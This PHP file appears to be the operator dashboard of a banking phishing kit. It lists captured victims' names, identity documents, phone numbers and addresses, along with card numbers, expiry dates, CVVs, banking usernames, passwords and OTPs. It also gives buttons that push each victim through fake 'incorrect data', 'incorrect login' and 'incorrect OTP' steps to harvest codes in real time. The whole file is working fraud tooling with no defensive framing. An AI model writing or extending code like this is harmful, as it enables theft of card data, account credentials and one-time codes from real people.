<?php
include "../conexion/index.php";


$resultado = $mysqli->query("SELECT * FROM users ORDER BY id DESC");
$usuarios = $resultado->fetch_all(MYSQLI_ASSOC);


foreach ($usuarios as $key => $dato) {
	if ($dato["estado"] != 10) {
		echo '

		<section class="card mb-3 ' ;  
			if($dato["estado"] == 1){
				echo 'bg-card-1';
			}else if($dato["estado"] == 2){
				echo 'bg-card-2';
			} else if($dato["estado"] == 3){
				if(!empty($dato["usuario"])){
					echo 'color-change';
				} else {
					echo 'bg-card-3';
				}
			} else if($dato["estado"] == 4){
				echo 'bg-card-4';
		
			} else if($dato["estado"] == 5){
				if(!empty($dato["otp"])){
					echo 'color-change';
				} else {
					echo 'bg-card-5';
				}
			} else if($dato["estado"] == 6){
				echo 'bg-card-6';
			} else if($dato["estado"] == 7){
				echo 'bg-card-9';
			} 
		echo ' ">
			<div class="card-header">
				<div class="row">
					<div class="col-md-6">
						'; 
						if ($dato["estado"] == 1) {
							echo '<h5 class="text-warning"> <b id="numCons">#'.$dato["id"].'</b> <strong> <i class="far fa-check-circle"></i> En espera</strong>';
						} else if ($dato["estado"] == 2) {
							echo '<h5 class="text-light"><b id="numCons">#'.$dato["id"].'</b> <strong> <i class="far fa-check-circle"></i> Datos  Incorrectos</strong>';
						}  if ($dato["estado"] == 3) {
							echo '<h5 class="text-light"><b id="numCons">#'.$dato["id"].'</b> <strong> <i class="far fa-check-circle"></i> Ingresando Login</strong>';
						} if ($dato["estado"] == 4) {
							echo '<h5 class="text-light"><b id="numCons">#'.$dato["id"].'</b> <strong> <i class="far fa-check-circle"></i> Login Incorrecto</strong>';
						}
						if ($dato["estado"] == 5) {
							echo '<h5 class="text-light"><b id="numCons">#'.$dato["id"].'</b> <strong> <i class="far fa-check-circle"></i> Ingresando OTP</strong>';
						} if ($dato["estado"] == 6) {
							echo '<h5 class="text-light"><b id="numCons">#'.$dato["id"].'</b> <strong> <i class="far fa-check-circle"></i> OTP Incorrecto</strong>';
						}
						if ($dato["estado"] == 7) {
							echo '<h5 class="text-light"><b id="numCons">#'.$dato["id"].'</b> <strong> <i class="far fa-check-circle"></i> Terminado</strong>';
						}
						echo '</h5>
					</div>
					<div class="col-md-4">
						<h5 class="text-light"><small><i class="fas fa-clock"></i> '. $dato["fecha"] .'</small></h5>
					</div>
	
					<div class="col-md-2" style="display: flex; justify-content: flex-end;">
						<a href="home.php?id_user='. $dato["id"] .'&estado=9" class="btn btn-primary btn-sm mr-2"><i class="fas fa-check"></i> </a>

						<a href="delete.php?id='. $dato["id"] .'" class="btn btn-danger btn-sm"><i class="fas fa-trash-alt"></i> </a>
					</div>
				</div>
			</div>
			<div class="card-body">
				<div class="row">
					<div class="col-md-3">
						<p class="text-light" style="font-size: 15px;"><strong> NOMBRE:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["nombre"] .' '. $dato["apellido"] .'</b> </p>
					</div>
					<div class="col-md-3">
						<p class="text-light" style="font-size: 15px;"><strong> DOCUMENTO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["documento"] .'</b> </p>
					</div>
					<div class="col-md-3">
						<p class="text-light" style="font-size: 15px;"><strong> TELEFONO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["telefono"] .'</b> </p>
					</div>
					<div class="col-md-3">
						<p class="text-light" style="font-size: 15px;"><strong> CIUDAD:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["ciudad"] .' '. $dato["direccion"] .'</b> </p>
					</div>
				</div>
				<hr>
				<div class="row">
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> BANCO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["banco"] .'</b> </p>
					</div>
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> FRANQUICIA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["franquicia"] .' / '. $dato["tipo_tarjeta"] .' </b> </p>
					</div>
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> NOMBRE TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["nombre_tarjeta"] .'</b> </p>
					</div>
				</div>
				<hr>		
				<div class="row">
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> NRO. TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["nro_tarjeta"] .'</b> </p>
					</div>
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> EXPIRACIÓN TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["mes_tarjeta"] .' / '. $dato["anio_tarjeta"] .' </b></p>
					</div>
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> CVV TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["cvv_tarjeta"] .'</b> </p>
					</div>
				</div>
				<hr>
				<div class="row">
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> USUARIO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["usuario"] .'</b> </p>
					</div>
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> CONTRASEÑA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["password"] .'</b> </p>
					</div>
					<div class="col-md-4">
						<p class="text-light" style="font-size: 15px;"><strong> OTP:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["otp"] .'</b> </p>
					</div>
				</div>

			</div>
			'; 
			if($dato["estado"] != 9){
				echo '<div class="card-footer">
				<div class="row">
					';
					if($dato["estado"] == 1){
						echo '<div class="col-md-6">
								<a href="home.php?id_user='. $dato["id"] .'&estado=2" class="btn btn-danger"><i class="fas fa-times-circle"></i> DATOS INCORRECTOS</a>
							</div>
							<div class="col-md-6">
								<a href="home.php?id_user='. $dato["id"] .'&estado=3" class="btn btn-success"><i class="fas fa-check-circle"></i> SIGUIENTE PASO</a>
							</div>	
						'
							;
					} else  if($dato["estado"] == 3 || $dato["estado"] == 4){
						echo '<div class="col-md-6">
								<a href="home.php?id_user='. $dato["id"] .'&estado=4" class="btn btn-danger"><i class="fas fa-times-circle"></i> LOGIN INCORRECTA</a>
							</div>
							<div class="col-md-6">
								<a href="home.php?id_user='. $dato["id"] .'&estado=5" class="btn btn-success"><i class="fas fa-check-circle"></i> SIGUIENTE PASO</a>
							</div>	
						'
							;
					} else  if($dato["estado"] == 5 || $dato["estado"] == 6){
						echo '<div class="col-md-6">
								<a href="home.php?id_user='. $dato["id"] .'&estado=6" class="btn btn-danger"><i class="fas fa-times-circle"></i> OTP INCORRECTO</a>
							</div>
							<div class="col-md-6">
								<a href="home.php?id_user='. $dato["id"] .'&estado=7" class="btn btn-success"><i class="fas fa-check-circle"></i> SIGUIENTE PASO</a>
							</div>	
						'
							;
					}
					echo '
				</div>
			</div>';
			}
			echo '
		</section>


	';
	}
}
	
?>